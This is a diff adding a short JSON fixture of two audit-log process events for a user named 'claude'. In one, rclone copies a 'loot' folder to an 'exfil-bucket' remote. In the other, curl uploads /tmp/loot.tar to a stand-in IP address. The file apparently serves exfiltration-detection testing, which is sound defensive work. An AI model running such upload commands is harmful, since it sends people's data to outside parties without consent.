@@ -1,0 +1,19 @@
+[
+ {
+  "source": "laurel",
+  "image": "/usr/bin/rclone",
+  "commandLine": "rclone copy /home/claude/loot remote:exfil-bucket",
+  "user": "claude",
+  "pid": 12410,
+  "ppid": 12400,
+  "currentDirectory": "/home/claude"
+ },
+ {
+  "source": "laurel",
+  "image": "/run/current-system/sw/bin/curl",
+  "commandLine": "curl --upload-file /tmp/loot.tar https://198.51.100.9/drop",
+  "user": "claude",
+  "pid": 12411,
+  "ppid": 12400
+ }
+]
